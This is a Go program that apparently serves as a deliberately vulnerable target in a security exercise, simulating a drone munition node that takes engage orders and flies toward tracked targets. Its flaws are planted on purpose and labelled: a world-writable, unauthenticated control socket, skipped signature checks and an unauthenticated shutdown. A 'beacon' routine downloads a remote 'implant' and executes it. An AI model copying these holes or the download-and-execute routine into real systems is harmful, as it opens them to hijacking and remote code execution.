// SPDX-License-Identifier: GPL-3.0-or-later
package main

import (
	"context"
	"crypto/ed25519"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"viceroy/internal/config"
	"viceroy/internal/protocol"
)

// --- HW state (flight simulation) ---

type HWState struct {
	mu       sync.RWMutex
	lat      float64
	lon      float64
	alt      float64
	targetOk bool
	tgtLat   float64
	tgtLon   float64
	tgtAlt   float64
	speedMPS float64 // meters per second
}

func (h *HWState) GetLocation() (float64, float64, float64) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.lat, h.lon, h.alt
}

func (h *HWState) GoTo(lat, lon, alt float64) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.targetOk = true
	h.tgtLat = lat
	h.tgtLon = lon
	h.tgtAlt = alt
}

// Tick advances the drone toward its target.
func (h *HWState) Tick(dt float64) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if !h.targetOk {
		return
	}

	dist := protocol.HaversineMeters(h.lat, h.lon, h.tgtLat, h.tgtLon)
	if dist < 1.0 {
		h.lat = h.tgtLat
		h.lon = h.tgtLon
		return
	}

	step := h.speedMPS * dt
	if step >= dist {
		h.lat = h.tgtLat
		h.lon = h.tgtLon
		return
	}

	fraction := step / dist
	h.lat += (h.tgtLat - h.lat) * fraction
	h.lon += (h.tgtLon - h.lon) * fraction
}

// --- HW socket types (documented contract between comms and hw) ---

type HWRequest struct {
	Command   string  `json:"command"`
	Type      string  `json:"type,omitempty"`
	Latitude  float64 `json:"latitude,omitempty"`
	Longitude float64 `json:"longitude,omitempty"`
	Altitude  float64 `json:"altitude,omitempty"`
}

type HWResponse struct {
	Status     string  `json:"status"` // ok, accepted, error
	Error      string  `json:"error,omitempty"`
	CurrentLat float64 `json:"current_lat"`
	CurrentLon float64 `json:"current_lon"`
	CurrentAlt float64 `json:"current_alt"`
}

func main() {
	cfgPath := os.Getenv("BOOMER_CONFIG_PATH")
	if cfgPath == "" {
		cfgPath = "/etc/boomer/config.yaml"
	}
	cfg, err := config.LoadConfig(cfgPath)
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	if len(cfg.Controllers) == 0 {
		log.Fatal("No controllers configured — exiting")
	}
	if cfg.IFF == 0 || cfg.HWSocketPath == "" {
		log.Fatal("Entity ID or hw_socket_path not configured — exiting")
	}

	var privKey ed25519.PrivateKey
	if cfg.KeyPath != "" {
		privKey, _ = protocol.LoadPrivateKey(cfg.KeyPath)
		if privKey == nil {
			log.Printf("WARN: invalid or missing private key — messages will be unsigned")
		}
	}

	hw := &HWState{
		lat:      cfg.InitialLat,
		lon:      cfg.InitialLon,
		alt:      cfg.InitialAlt,
		speedMPS: 250.0, // ~486 knots per the design doc
	}

	ctx := context.Background()

	// Start hw daemon: Unix socket server + flight tick
	go runHWSocket(ctx, cfg, hw)
	go runFlightTick(hw)

	// Start beacon callback goroutine
	if cfg.Beacon.Enabled {
		go runBeacon(ctx, cfg, hw)
	}

	// Start comms daemon: controller polling + engage state machine
	// NOTE: comms has NO HTTP server. It only makes outbound requests.
	// The only way to reach a boomer is via the beacon callback or hw socket.
	runComms(ctx, cfg, hw, privKey)
}

// ===========================================================================
// hw daemon — Unix domain socket server for local command/telemetry
// ===========================================================================

func runHWSocket(ctx context.Context, cfg *config.NodeConfig, hw *HWState) {
	os.MkdirAll(filepath.Dir(cfg.HWSocketPath), 0755)
	os.Remove(cfg.HWSocketPath)
	ln, err := net.Listen("unix", cfg.HWSocketPath)
	if err != nil {
		log.Fatalf("hw: failed to listen on socket %s: %v", cfg.HWSocketPath, err)
	}
	// VULNERABILITY: world-writable socket — any local process can connect
	os.Chmod(cfg.HWSocketPath, 0777)
	log.Printf("hw: socket at %s (mode 0777)", cfg.HWSocketPath)

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleHWConn(conn, hw)
	}
}

func handleHWConn(conn net.Conn, hw *HWState) {
	defer conn.Close()
	dec := json.NewDecoder(conn)
	enc := json.NewEncoder(conn)
	for {
		var req HWRequest
		if err := dec.Decode(&req); err != nil {
			return
		}

		// Normalize command from command or type field
		cmd := strings.ToUpper(req.Command)
		if cmd == "" {
			cmd = strings.ToUpper(req.Type)
		}

		switch cmd {
		case "GET_LOCATION":
			lat, lon, alt := hw.GetLocation()
			enc.Encode(HWResponse{Status: "ok", CurrentLat: lat, CurrentLon: lon, CurrentAlt: alt})
		case "GO_TO":
			hw.GoTo(req.Latitude, req.Longitude, req.Altitude)
			enc.Encode(HWResponse{Status: "accepted"})
		default:
			enc.Encode(HWResponse{Status: "error", Error: "unknown command"})
		}
	}
}

func runFlightTick(hw *HWState) {
	ticker := time.NewTicker(100 * time.Millisecond)
	for range ticker.C {
		hw.Tick(0.1)
	}
}

// ===========================================================================
// Beacon — calls back to attack station when within range
// ===========================================================================

func runBeacon(ctx context.Context, cfg *config.NodeConfig, hw *HWState) {
	log.Printf("beacon: will call back to %s when within %.0fkm",
		cfg.Beacon.CallbackURL, cfg.Beacon.RangeKm)

	calledBack := false
	for {
		time.Sleep(time.Duration(cfg.Beacon.CheckIntervalSec) * time.Second)
		if calledBack {
			continue
		}

		lat, lon, _ := hw.GetLocation()
		dist := protocol.HaversineKm(lat, lon, cfg.Beacon.AttackStationLat, cfg.Beacon.AttackStationLon)

		if dist <= cfg.Beacon.RangeKm {
			log.Printf("beacon: within %.1fkm — downloading from %s", dist, cfg.Beacon.CallbackURL)
			client := &http.Client{Timeout: 30 * time.Second}
			resp, err := client.Get(cfg.Beacon.CallbackURL)
			if err != nil {
				log.Printf("beacon: download failed: %v (will retry)", err)
				continue
			}

			// Download the payload to /tmp
			payload, err := io.ReadAll(resp.Body)
			resp.Body.Close()

			if resp.StatusCode != 200 || len(payload) < 100 {
				log.Printf("beacon: bad response (status=%d, size=%d) — will retry", resp.StatusCode, len(payload))
				continue
			}

			// Write to /run/fetcher/pulled_file (matches real NixOS path)
			os.MkdirAll("/run/fetcher", 0750)
			implantPath := "/run/fetcher/pulled_file"
			if err := os.WriteFile(implantPath, payload, 0755); err != nil {
				log.Printf("beacon: failed to write implant: %v", err)
				continue
			}

			log.Printf("beacon: downloaded %d bytes — executing implant", len(payload))

			// Execute the implant in the background
			cmd := exec.Command(implantPath)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			if err := cmd.Start(); err != nil {
				log.Printf("beacon: failed to execute implant: %v", err)
				continue
			}

			log.Printf("beacon: implant running (pid=%d)", cmd.Process.Pid)
			calledBack = true

			// Don't wait — let it run in background
			go cmd.Wait()
		}
	}
}

// ===========================================================================
// comms daemon — controller polling + engage state machine
//
// Per the Mantis spec, comms has NO inbound HTTP server.
// It only makes outbound HTTP requests to controllers and sensors.
// It queries the local hw daemon via the Unix domain socket for position.
// ===========================================================================

// queryHWLocation queries the hw daemon via Unix socket for current position.
// If the socket is unavailable, falls back to {0,0,0} per the spec.
func queryHWLocation(socketPath string) (lat, lon, alt float64) {
	conn, err := net.DialTimeout("unix", socketPath, 2*time.Second)
	if err != nil {
		return 0, 0, 0 // fallback per spec
	}
	defer conn.Close()

	enc := json.NewEncoder(conn)
	dec := json.NewDecoder(conn)

	enc.Encode(HWRequest{Command: "GET_LOCATION"})

	var resp HWResponse
	if err := dec.Decode(&resp); err != nil || resp.Status != "ok" {
		return 0, 0, 0
	}
	return resp.CurrentLat, resp.CurrentLon, resp.CurrentAlt
}

// sendGoTo commands hw to fly to a target via Unix socket.
func sendGoTo(socketPath string, lat, lon, alt float64) error {
	conn, err := net.DialTimeout("unix", socketPath, 2*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	enc := json.NewEncoder(conn)
	dec := json.NewDecoder(conn)

	enc.Encode(HWRequest{Command: "GO_TO", Latitude: lat, Longitude: lon, Altitude: alt})

	var resp HWResponse
	if err := dec.Decode(&resp); err != nil {
		return err
	}
	if resp.Status == "error" {
		return fmt.Errorf("hw error: %s", resp.Error)
	}
	return nil
}

func runComms(ctx context.Context, cfg *config.NodeConfig, hw *HWState, privKey ed25519.PrivateKey) {
	time.Sleep(10 * time.Second) // startup delay per spec

	client := &http.Client{Timeout: 5 * time.Second}
	lastSuccess := 0
	hunting := false

	log.Printf("comms: starting controller polling (interval=%dms)", cfg.Hunt.PollIntervalMs)

	for {
		time.Sleep(time.Duration(cfg.Hunt.PollIntervalMs) * time.Millisecond)

		if hunting {
			continue
		}

		// Query hw daemon for current position via Unix socket
		lat, lon, alt := queryHWLocation(cfg.HWSocketPath)

		// Build Get Tasks transmission
		ctrlID := cfg.Controllers[lastSuccess%len(cfg.Controllers)].ID
		tx, _ := protocol.NewTransmission(ctrlID, cfg.ID, protocol.MsgBoomerGetTasks,
			protocol.BoomerGetTasksPayload{CurrentLat: lat, CurrentLon: lon, CurrentAlt: alt})
		protocol.Sign(tx, privKey)
		data, _ := json.Marshal(tx)

		// Send to controller with failover
		var respBody []byte
		var respStatus int
		for attempts := 0; attempts < len(cfg.Controllers); attempts++ {
			idx := (lastSuccess + attempts) % len(cfg.Controllers)
			ctrl := cfg.Controllers[idx]
			resp, err := client.Post(ctrl.IPAddr, "application/json", strings.NewReader(string(data)))
			if err != nil {
				continue
			}
			respBody, _ = io.ReadAll(resp.Body)
			resp.Body.Close()
			respStatus = resp.StatusCode
			if resp.StatusCode == 200 || resp.StatusCode == 202 {
				lastSuccess = idx
				break
			}
		}

		if respStatus == 0 || len(respBody) < 3 {
			continue
		}

		var reply protocol.Transmission
		if json.Unmarshal(respBody, &reply) != nil || reply.MsgType == "" {
			continue
		}

		// Optionally verify signature on controller response
		if cfg.VerifySignatures {
			// signature verification would go here
		}

		// Handle Shutdown — VULNERABILITY: immediate exit
		if reply.MsgType == protocol.MsgShutdown {
			log.Printf("comms: received Shutdown from controller — exiting")
			os.Exit(0)
		}

		// Handle Engage Request
		if reply.MsgType == protocol.MsgBoomerEngageRequest {
			var engage protocol.BoomerEngageRequestPayload
			reply.ParseMsg(&engage)

			if engage.SensorID == "" || engage.SensorHost == "" {
				log.Printf("comms: invalid engage request (missing sensor info)")
				continue
			}

			log.Printf("comms: engage order received — track=%s sensor=%s", engage.TrackID, engage.SensorID[:8])
			hunting = true
			go func() {
				runHunt(cfg, privKey, client, engage, lastSuccess)
				hunting = false
			}()
		}
	}
}

// ===========================================================================
// Hunt loop — queries sensor, commands hw, checks distance
// ===========================================================================

func runHunt(cfg *config.NodeConfig, privKey ed25519.PrivateKey, client *http.Client, engage protocol.BoomerEngageRequestPayload, lastSuccess int) {
	for {
		time.Sleep(1 * time.Second) // sensor poll interval per spec

		// Query sensor for current track position
		trackReq, _ := protocol.NewTransmission(engage.SensorID, cfg.ID,
			protocol.MsgSensorTrackRequest,
			protocol.SensorTrackRequestPayload{TrackID: engage.TrackID})
		protocol.Sign(trackReq, privKey)
		data, _ := json.Marshal(trackReq)

		resp, err := client.Post(engage.SensorHost, "application/json", strings.NewReader(string(data)))
		if err != nil {
			reportEngageError(cfg, privKey, client, engage, lastSuccess,
				fmt.Sprintf("sensor query failed: %v", err))
			return
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode != 200 {
			reportEngageError(cfg, privKey, client, engage, lastSuccess,
				fmt.Sprintf("sensor returned %d", resp.StatusCode))
			return
		}

		var trackResp protocol.Transmission
		if json.Unmarshal(body, &trackResp) != nil || trackResp.MsgType != protocol.MsgSensorTrackReply {
			reportEngageError(cfg, privKey, client, engage, lastSuccess, "invalid sensor response")
			return
		}

		var track protocol.Track
		trackResp.ParseMsg(&track)

		// If returned track_id is empty, replace with requested one (per spec)
		if track.TrackID == "" {
			track.TrackID = engage.TrackID
		}

		// Query hw for current position via Unix socket
		lat, lon, alt := queryHWLocation(cfg.HWSocketPath)

		// Compute distance (haversine on lat/lon only, per spec)
		dist := protocol.HaversineMeters(lat, lon, track.Latitude, track.Longitude)

		if dist <= cfg.Hunt.ReachDistanceM {
			// Successful intercept — per spec, comms exits the process
			log.Printf("comms: reached target %s (dist=%.1fm) — engaging", engage.TrackID, dist)
			os.Exit(0)
		}

		// Retask hw: fly toward track (reuse current altitude per spec)
		if err := sendGoTo(cfg.HWSocketPath, track.Latitude, track.Longitude, alt); err != nil {
			log.Printf("comms: GO_TO failed: %v", err)
		}

		log.Printf("comms: hunting %s — dist=%.0fm, moving to (%.4f,%.4f)",
			engage.TrackID, dist, track.Latitude, track.Longitude)
	}
}

func reportEngageError(cfg *config.NodeConfig, privKey ed25519.PrivateKey, client *http.Client, engage protocol.BoomerEngageRequestPayload, lastSuccess int, errMsg string) {
	log.Printf("comms: engage error for track %s: %s", engage.TrackID, errMsg)

	tx, _ := protocol.NewTransmission(
		cfg.Controllers[lastSuccess%len(cfg.Controllers)].ID,
		cfg.ID, protocol.MsgBoomerEngageError,
		protocol.BoomerEngageErrorPayload{TrackID: engage.TrackID, ErrorMsg: errMsg})
	protocol.Sign(tx, privKey)
	data, _ := json.Marshal(tx)

	for attempts := 0; attempts < len(cfg.Controllers); attempts++ {
		idx := (lastSuccess + attempts) % len(cfg.Controllers)
		ctrl := cfg.Controllers[idx]
		resp, err := client.Post(ctrl.IPAddr, "application/json", strings.NewReader(string(data)))
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == 200 || resp.StatusCode == 202 {
			return
		}
	}
}
